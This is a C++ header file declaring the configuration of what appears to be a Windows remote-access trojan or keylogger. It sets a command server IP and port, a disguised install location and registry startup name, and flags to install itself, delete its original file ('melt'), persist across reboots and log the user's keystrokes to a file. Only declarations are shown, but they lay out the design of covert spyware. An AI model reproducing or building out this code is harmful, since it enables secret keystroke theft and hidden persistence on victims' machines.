#pragma once

#ifndef SETTINGS_H
#define SETTINGS_H

#include <string>
#include <Windows.h>



class Settings
{
public:
	static std::string serverIP;
	static int serverPort;

	static std::string fileName;		//file name
	static std::string folderName;	//folder name
	static std::string startupName;		//startup name in registry / taskmgr
	static std::string logFileName;		//log file name
	static std::string installLocation; //install location (appdata, programdata etc)
	static std::string keylogPath;		//path of the key press log file
	static bool installSelf;			//specifies whether the program should install itself
	static bool startOnNextBoot;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
	static bool meltSelf;				//specifies whether the installed clone should delete the initial file
	static bool setStartupSelf;			//specifies whether the program is to be started on system boot
	static bool logEvents;				//specifies whether the program should log events (like errors etc)
	static bool logKeys;				//specifies whether the program should log the users keystrokes

};

#endif // !SETTINGS_H